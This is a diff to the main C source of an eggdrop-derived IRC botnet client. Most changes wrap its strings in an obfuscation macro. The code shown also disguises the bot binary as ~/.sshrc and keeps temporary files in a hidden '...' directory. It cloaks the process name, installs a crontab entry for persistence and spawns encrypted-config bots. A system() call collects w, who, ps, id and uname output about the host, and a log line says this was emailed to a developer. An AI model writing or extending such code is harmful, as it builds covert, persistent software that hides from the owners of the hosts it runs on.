@@ -255,10 +255,8 @@ void write_debug()
     setsock(x, SOCK_NONSOCK);
     if (x >= 0) {
       strncpyz(s, ctime(&now), sizeof s);
-      dprintf(-x, "Debug (%s) written %s\n", ver, s);
-      dprintf(-x, "Please report problem to bugs@eggheads.org\n");
-      dprintf(-x, "after a visit to http://www.eggheads.org/bugzilla/\n");
-      dprintf(-x, "Context: ");
+      dprintf(-x, STR("Debug (%s) written %s\n"), ver, s);
+      dprintf(-x, STR("Context: "));
       cx_ptr = cx_ptr & 15;
       for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
 	dprintf(-x, "%s/%d,\n         ", cx_file[y], cx_line[y]);
@@ -282,11 +280,11 @@ void write_debug()
   x = creat("DEBUG", 0600);
   setsock(x, SOCK_NONSOCK);
   if (x < 0) {
-    putlog(LOG_MISC, "*", "* Failed to write DEBUG");
+    putlog(LOG_MISC, "*", STR("* Failed to write DEBUG"));
   } else {
     strncpyz(s, ctime(&now), sizeof s);
-    dprintf(-x, "Debug (%s) written %s\n", ver, s);
-    dprintf(-x, "STATICALLY LINKED\n");
+    dprintf(-x, STR("Debug (%s) written %s\n"), ver, s);
+    dprintf(-x, STR("STATICALLY LINKED\n"));
 
     /* info library */
     dprintf(-x, "Tcl library: %s\n",
@@ -301,20 +299,20 @@ void write_debug()
      "*unknown*");
 
 #if HAVE_TCL_THREADS
-    dprintf(-x, "Tcl is threaded\n");
+    dprintf(-x, STR("Tcl is threaded\n"));
 #endif
 
 #ifdef CCFLAGS
-    dprintf(-x, "Compile flags: %s\n", CCFLAGS);
+    dprintf(-x, STR("Compile flags: %s\n"), CCFLAGS);
 #endif
 #ifdef LDFLAGS
-    dprintf(-x, "Link flags: %s\n", LDFLAGS);
+    dprintf(-x, STR("Link flags: %s\n"), LDFLAGS);
 #endif
 #ifdef STRIPFLAGS
-    dprintf(-x, "Strip flags: %s\n", STRIPFLAGS);
+    dprintf(-x, STR("Strip flags: %s\n"), STRIPFLAGS);
 #endif
 
-    dprintf(-x, "Context: ");
+    dprintf(-x, STR("Context: "));
     cx_ptr = cx_ptr & 15;
     for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
       dprintf(-x, "%s/%d, [%s]\n         ", cx_file[y], cx_line[y],
@@ -326,8 +324,9 @@ void write_debug()
     debug_mem_to_dcc(-x);
     killsock(x);
     close(x);
-    putlog(LOG_MISC, "*", "* Emailed DEBUG to bryan.");
+    putlog(LOG_MISC, "*", STR("* Emailed DEBUG to bryan."));
     if (1) {
+/* FIXME: make into temp file.. */
       char buff[255];
       snprintf(buff, sizeof(buff), "cat << EOFF >> bleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat DEBUG`\nEOFF", origbotname);
       system(buff);
@@ -345,7 +344,7 @@ static void got_bus(int z)
 #ifdef DEBUG_CONTEXT
   write_debug();
 #endif
-  fatal("BUS ERROR -- CRASHING!", 1);
+  fatal(STR("BUS ERROR -- CRASHING!"), 1);
 #ifdef SA_RESETHAND
   kill(getpid(), SIGBUS);
 #else
@@ -359,7 +358,7 @@ static void got_segv(int z)
 #ifdef DEBUG_CONTEXT
   write_debug();
 #endif
-  fatal("SEGMENT VIOLATION -- CRASHING!", 1);
+  fatal(STR("SEGMENT VIOLATION -- CRASHING!"), 1);
 #ifdef SA_RESETHAND
   kill(getpid(), SIGSEGV);
 #else
@@ -373,7 +372,7 @@ static void got_fpe(int z)
 #ifdef DEBUG_CONTEXT
   write_debug();
 #endif
-  fatal("FLOATING POINT ERROR -- CRASHING!", 0);
+  fatal(STR("FLOATING POINT ERROR -- CRASHING!"), 0);
 }
 
 static void got_term(int z)
@@ -384,29 +383,29 @@ static void got_term(int z)
   check_tcl_event("sigterm");
   if (die_on_sigterm) {
     botnet_send_chat(-1, botnetnick, "ACK, I've been terminated!");
-    fatal("TERMINATE SIGNAL -- SIGNING OFF", 0);
+    fatal(STR("TERMINATE SIGNAL -- SIGNING OFF"), 0);
   } else {
-    putlog(LOG_MISC, "*", "RECEIVED TERMINATE SIGNAL (IGNORING)");
+    putlog(LOG_MISC, "*", STR("RECEIVED TERMINATE SIGNAL (IGNORING)"));
   }
 }
 
 static void got_stop(int z) 
 {
+  putlog(LOG_MISC, "*", STR("GOT SIGSTOP POSSIBLE HIJACK."));
   exit(1);
-  putlog(LOG_MISC, "*", "GOT SIGSTOP POSSIBLE HIJACK.");
 }
 
 #ifdef S_HIJACKCHECK
 static void got_cont(int z) 
 {
-  detected(DETECT_SIGCONT, "POSSIBLE HIJACK DETECTED");
+  detected(DETECT_SIGCONT, STR("POSSIBLE HIJACK DETECTED"));
 }
 #endif
 
 static void got_quit(int z)
 {
   check_tcl_event("sigquit");
-  putlog(LOG_MISC, "*", "RECEIVED QUIT SIGNAL (IGNORING)");
+  putlog(LOG_MISC, "*", STR("RECEIVED QUIT SIGNAL (IGNORING)"));
   return;
 }
 
@@ -417,9 +416,9 @@ static void got_hup(int z)
 #endif
   check_tcl_event("sighup");
   if (die_on_sighup) {
-    fatal("HANGUP SIGNAL -- SIGNING OFF", 0);
+    fatal(STR("HANGUP SIGNAL -- SIGNING OFF"), 0);
   } else
-    putlog(LOG_MISC, "*", "Received HUP signal: rehashing...");
+    putlog(LOG_MISC, "*", STR("Received HUP signal: rehashing..."));
   do_restart = -2;
   return;
 }
@@ -428,7 +427,6 @@ static void got_hup(int z)
  */
 static void got_alarm(int z)
 {
-  debug0("got alarm...");
   longjmp(alarmret, 1);
 
   /* -Never reached- */
@@ -440,8 +438,8 @@ static void got_ill(int z)
 {
   check_tcl_event("sigill");
 #ifdef DEBUG_CONTEXT
-  putlog(LOG_MISC, "*", "* Context: %s/%d [%s]", cx_file[cx_ptr],
-	 cx_line[cx_ptr], (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
+  putlog(LOG_MISC, "*", STR("* Context: %s/%d [%s]"), cx_file[cx_ptr], cx_line[cx_ptr],
+                         (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
 #endif
 }
 
@@ -490,10 +488,10 @@ void eggAssert(const char *file, int line, const char *module)
   write_debug();
 #endif /* DEBUG_CONTEXT */
   if (!module)
-    putlog(LOG_MISC, "*", "* In file %s, line %u", file, line);
+    putlog(LOG_MISC, "*", STR("* In file %s, line %u"), file, line);
   else
-    putlog(LOG_MISC, "*", "* In file %s:%s, line %u", module, file, line);
-  fatal("ASSERT FAILED -- CRASHING!", 1);
+    putlog(LOG_MISC, "*", STR("* In file %s:%s, line %u"), module, file, line);
+  fatal(STR("ASSERT FAILED -- CRASHING!"), 1);
 }
 #endif /* DEBUG_ASSERT */
 
@@ -516,7 +514,7 @@ void checkpass()
     for(i=0; i<16; i++)
       sprintf(md5string + (i*2), "%.2x", md5out[i]);
     if (strcmp(shellpass, md5string)) {
-      fatal("incorrect password.", 0);
+      fatal(STR("incorrect password."), 0);
     }
     gpasswd = 0;
     checkedpass = 1;
@@ -531,7 +529,7 @@ void gen_conf(char *filename)
   FILE *fp;
 
   if (is_file(filename) || is_dir(filename))
-    fatal("File already exists..", 0);
+    fatal(STR("File already exists.."), 0);
   
   fp = fopen(filename, "w+");
 
@@ -562,7 +560,7 @@ void gen_conf(char *filename)
   fprintf(fp, STR("\n\n\n\n#if there are any trailing newlines at the end, remove them up to the last bot.\n"));
   fflush(fp);
   fclose(fp);
-  printf("Template config created as '%s'\n", filename);
+  printf(STR("Template config created as '%s'\n"), filename);
   exit(0);
 }
 
@@ -621,7 +619,7 @@ static void dtx_arg(int argc, char *argv[])
         if (p)
           gen_conf(p);
         else
-          fatal("You must specify a filename after -g", 0);
+          fatal(STR("You must specify a filename after -g"), 0);
         break; /* never reached */
       case 'k':
         p = argv[optind];
@@ -639,22 +637,22 @@ static void dtx_arg(int argc, char *argv[])
         break;
       case 'D':
         sdebug = 1;
-        sdprintf("debug enabled");
+        sdprintf(STR("debug enabled"));
         break;
       case 'E':
         p = argv[optind];
         if (p) {
           if (!strcmp(p, "all")) {
             int n;
-            putlog(LOG_MISC, "*", "Listing all errors");
+            putlog(LOG_MISC, "*", STR("Listing all errors"));
             for (n = 1; n < ERR_MAX; n++)
-              putlog(LOG_MISC, "*", "Error #%d: %s", n, werr_tostr(n));
+              putlog(LOG_MISC, "*", STR("Error #%d: %s"), n, werr_tostr(n));
           } else {
-            putlog(LOG_MISC, "*", "Error #%d: %s", atoi(p), werr_tostr(atoi(p)));
+            putlog(LOG_MISC, "*", STR("Error #%d: %s"), atoi(p), werr_tostr(atoi(p)));
           }
           exit(0);
         } else {
-          fatal("You must specify error number after -E (or 'all')", 0);
+          fatal(STR("You must specify error number after -E (or 'all')"), 0);
         }
          break;
       case 'e':
@@ -681,7 +679,7 @@ static void dtx_arg(int argc, char *argv[])
         if (getppid() != atoi(argv[optind]))
           exit(0);
         else {
-          sdprintf("Updating...");
+          sdprintf(STR("Updating..."));
         }
         localhub = 1;
         updating = 1;
@@ -772,7 +770,7 @@ static void core_secondly()
   int miltime, idx;
  
   if (geteuid() != myuid || getuid() != myuid) {
-    putlog(LOG_MISC, "*", "MY UID CHANGED!, POSSIBLE HIJACK ATTEMPT");
+    putlog(LOG_MISC, "*", STR("MY UID CHANGED!, POSSIBLE HIJACK ATTEMPT"));
   }
   do_check_timers(&utimer);	/* Secondly timers */
   if (fork_interval && backgrd) {
@@ -821,13 +819,13 @@ static void core_secondly()
     /* In case for some reason more than 1 min has passed: */
     while (nowtm.tm_min != lastmin) {
       /* Timer drift, dammit */
-      debug2("timer: drift (lastmin=%d, now=%d)", lastmin, nowtm.tm_min);
+      debug2(STR("timer: drift (lastmin=%d, now=%d)"), lastmin, nowtm.tm_min);
       i++;
       lastmin = (lastmin + 1) % 60;
       call_hook(HOOK_MINUTELY);
     }
     if (i > 1)
-      putlog(LOG_MISC, "*", "(!) timer drift -- spun %d minutes", i);
+      putlog(LOG_MISC, "*", STR("(!) timer drift -- spun %d minutes"), i);
     miltime = (nowtm.tm_hour * 100) + (nowtm.tm_min);
     if (((int) (nowtm.tm_min / 5) * 5) == (nowtm.tm_min)) {	/* 5 min */
       call_hook(HOOK_5MINUTELY);
@@ -837,7 +835,7 @@ static void core_secondly()
 
 	strncpyz(s, ctime(&now), sizeof s);
 #ifdef HUB
-	putlog(LOG_ALL, "*", "--- %.11s%s", s, s + 20);
+	putlog(LOG_ALL, "*", STR("--- %.11s%s"), s, s + 20);
 	call_hook(HOOK_BACKUP);
 #endif
       }
@@ -871,7 +869,7 @@ static void check_mypid()
     fgets(s, 10, fp);
     xx = atoi(s);
     if (getpid() != xx) { //we have a major problem if this is happening..
-      fatal("getpid() does not match pid in file. Possible cloned process, exiting..", 1);
+      fatal(STR("getpid() does not match pid in file. Possible cloned process, exiting.."), 1);
       if ((me = module_find("server", 0, 0))) {
         Function *func = me->funcs;
         (func[SERVER_NUKESERVER]) ("cloned process");
@@ -955,19 +953,19 @@ int init_userrec(), init_mem(), init_dcc_max(), init_userent(), init_misc(), ini
 void got_ed(char *which, char *in, char *out)
 {
 Context;
-  sdprintf("got_Ed called: -%s i: %s o: %s", which, in, out);
+  sdprintf(STR("got_Ed called: -%s i: %s o: %s"), which, in, out);
   if (!in || !out)
-    fatal("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>",0);
+    fatal(STR("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>"),0);
   if (!strcmp(in, out))
     fatal(STR("<infile> should NOT be the same name as <outfile>"), 0);
   check_static("blowfish", blowfish_start);
   module_load(ENCMOD);
   if (!strcmp(which, "e")) {
     EncryptFile(in, out);
-    fatal("File Encryption complete",3);
+    fatal(STR("File Encryption complete"),3);
   } else if (!strcmp(which, "d")) {
     DecryptFile(in, out);
-    fatal("File Decryption complete",3);
+    fatal(STR("File Decryption complete"),3);
   }
   exit(0);
 }
@@ -1046,14 +1044,14 @@ static void check_crontab()
 
 #ifdef LEAF
   if (!localhub) 
-    fatal("something is wrong.", 0);
-#endif
+    fatal(STR("something is wrong."), 0);
+#endif /* LEAF */
   i=crontab_exists();
   if (!i) {
     crontab_create(5);
     i=crontab_exists();
     if (!i)
-      printf("* Error writing crontab entry.\n");
+      printf(STR("* Error writing crontab entry.\n"));
   }
 }
 
@@ -1064,7 +1062,7 @@ static void gotspawn(char *filename)
   char templine[8192], *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps;
 
   if (!(fp = fopen(filename, "r")))
-    fatal("Cannot read from local config (2)", 0);
+    fatal(STR("Cannot read from local config (2)"), 0);
 
   check_static("blowfish", blowfish_start);
   module_load(ENCMOD);
@@ -1075,7 +1073,7 @@ static void gotspawn(char *filename)
     temps = (char *) decrypt_string(netpass, decryptit(templine));
 
 #ifdef S_PSCLOAK
-    sdprintf("GOTSPAWN: %s", temps);
+    sdprintf(STR("GOTSPAWN: %s"), temps);
 #endif /* S_PSCLOAK */
 
     pscloak = atoi(newsplit(&temps));
@@ -1131,7 +1129,7 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, in
 
 
   if (!(fp = fopen(buf, "w")))
-    fatal("Cannot create spawnfiles...", 0);
+    fatal(STR("Cannot create spawnfiles..."), 0);
 
   lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip ? ip : ".", host ? host : ".", ipsix ? ipsix : ".");
 
@@ -1141,7 +1139,7 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, in
   sprintf(bufrun, "%s -c %s", bin, buf);
   return system(bufrun);
 }
-#endif
+#endif /* LEAF */
 
 #ifdef S_MESSUPTERM 
 void messup_term() {
@@ -1417,27 +1415,26 @@ int main(int argc, char **argv)
   init_settings();
   init_tcl(argc, argv);
   if (argc) {
-    sdprintf("Calling dtx_arg with %d params.", argc);
+    sdprintf(STR("Calling dtx_arg with %d params."), argc);
     dtx_arg(argc, argv);
   }
   if (checktrace)
     check_trace_start();
 
-#ifdef LEAF
-  sdprintf("my uid: %d my uuid: %d, my ppid: %d my pid: %d", getuid(), geteuid(), getppid(), getpid());
-  chdir(homedir());
-  snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
-  snprintf(tempdir, sizeof tempdir, "%s/...", confdir());
-#endif /* LEAF */
 #ifdef HUB
   snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir());
 #endif /* HUB */
 
 #ifdef LEAF
-  sdprintf("newbin at: %s", newbin);
+  sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
+  chdir(homedir());
+  snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
+  snprintf(tempdir, sizeof tempdir, "%s/...", confdir());
+
+  sdprintf(STR("newbin at: %s"), newbin);
 
   if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
-    sdprintf("wrong dir, is: %s :: %s", binname, newbin);
+    sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
     unlink(newbin);
     if (copyfile(binname,newbin))
      ok = 0;
@@ -1565,7 +1562,7 @@ Context;
       else if (c[0] == '-' && !skip) { //this is the uid
         newsplit(&temps);
         if (geteuid() != atoi(temps)) {
-          sdprintf("wrong uid, conf: %d :: %d", atoi(temps), geteuid());
+          sdprintf(STR("wrong uid, conf: %d :: %d"), atoi(temps), geteuid());
           werr(ERR_WRONGUID);
         }
       } else if (c[0] == '+' && !skip) { //this is the uname
@@ -1573,13 +1570,13 @@ Context;
         newsplit(&temps);
         snprintf(check, sizeof check, "%s %s", unix_n, vers_n);
         if ((r = strcmp(temps, check))) {
-          sdprintf("wrong uname, conf: %s :: %s", check, temps);
+          sdprintf(STR("wrong uname, conf: %s :: %s"), check, temps);
           werr(ERR_WRONGUNAME);
         }
       } else if (c[0] == '!') { //local tcl exploit
         if (c[1] == '-') { //dont use pscloak
 #ifdef S_PSCLOAK
-          sdprintf("NOT CLOAKING");
+          sdprintf(STR("NOT CLOAKING"));
 #endif /* S_PSCLOAK */
           pscloak = 0;
         } else {
@@ -1592,7 +1589,7 @@ Context;
         nick = newsplit(&temps);
         if (!nick || !nick[0])
           werr(ERR_BADCONF);
-          sdprintf("Read nick from config: %s", nick);
+          sdprintf(STR("Read nick from config: %s"), nick);
         if (temps[0])
           ip = newsplit(&temps);
         if (temps[0])
@@ -1603,7 +1600,7 @@ Context;
         if (i == 1) { //this is the first bot ran/parsed
           strncpyz(s, ctime(&now), sizeof s);
           strcpy(&s[11], &s[20]);
-//          printf("--- Loading %s (%s)\n\n", ver, s);
+          /* printf(STR("--- Loading %s (%s)\n\n"), ver, s); */
 
           if (ip && ip[0] == '!') { //natip
             ip++;
@@ -1648,11 +1645,11 @@ Context;
             if (errno == ESRCH || (updating && !x)) { //PID is !running, safe to run.
 
             if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
-                printf("* Failed to spawn %s\n", nick); //This probably won't ever happen.
+                printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
             } 
           } else {
             if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
-              printf("* Failed to spawn %s\n", nick); //This probably won't ever happen.
+              printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
           }
         }
 #endif /* LEAF */
@@ -1683,7 +1680,7 @@ Context;
 
 #ifdef LEAF
   if (localhub) {
-    sdprintf("I am localhub (%s)", origbotname);
+    sdprintf(STR("I am localhub (%s)"), origbotname);
 #endif /* LEAF */
     check_crontab();
 #ifdef LEAF
@@ -1709,7 +1706,7 @@ Context;
       xx = atoi(s);
       kill(xx, SIGCHLD);
       if (errno != ESRCH) { //!= is PID is running.
-        sdprintf("%s is already running, pid: %d", botnetnick, xx);
+        sdprintf(STR("%s is already running, pid: %d"), botnetnick, xx);
         bg_send_quit(BG_ABORT);
         exit(1);
       }
@@ -1730,7 +1727,7 @@ Context;
   i = 0;
   for (chan = chanset; chan; chan = chan->next)
     i++;
-  putlog(LOG_MISC, "*", "=== %s: %d channels, %d users.",
+  putlog(LOG_MISC, "*", STR("=== %s: %d channels, %d users."),
 	 botnetnick, i, count_users(userlist));
   /* Move into background? */
 
@@ -1758,7 +1755,7 @@ Context;
       } else
         printf(EGG_NOWRITE, pid_file);
 #ifdef CYGWIN_HACKS
-      printf("Launched into the background  (pid: %d)\n\n", xx);
+      printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
 #endif /* CYGWIN_HACKS */
     }
   }
@@ -1819,7 +1816,7 @@ Context;
 
   call_hook(HOOK_LOADED);
 
-  debug0("main: entering loop");
+  debug0(STR("main: entering loop"));
   while (1) {
     int socket_cleanup = 0;
 
@@ -1891,7 +1888,7 @@ Context;
       int idx;
 
       if (i == STDOUT && !backgrd)
-	fatal("END OF FILE ON TERMINAL", 0);
+	fatal(STR("END OF FILE ON TERMINAL"), 0);
       for (idx = 0; idx < dcc_total; idx++)
 	if (dcc[idx].sock == i) {
 	  if (dcc[idx].type && dcc[idx].type->eof)
@@ -1912,7 +1909,7 @@ Context;
 	killsock(i);
       }
     } else if (xx == -2 && errno != EINTR) {	/* select() error */
-      putlog(LOG_MISC, "*", "* Socket error #%d; recovering.", errno);
+      putlog(LOG_MISC, "*", STR("* Socket error #%d; recovering."), errno);
       for (i = 0; i < dcc_total; i++) {
 	if ((fcntl(dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF)) {
 	  putlog(LOG_MISC, "*",
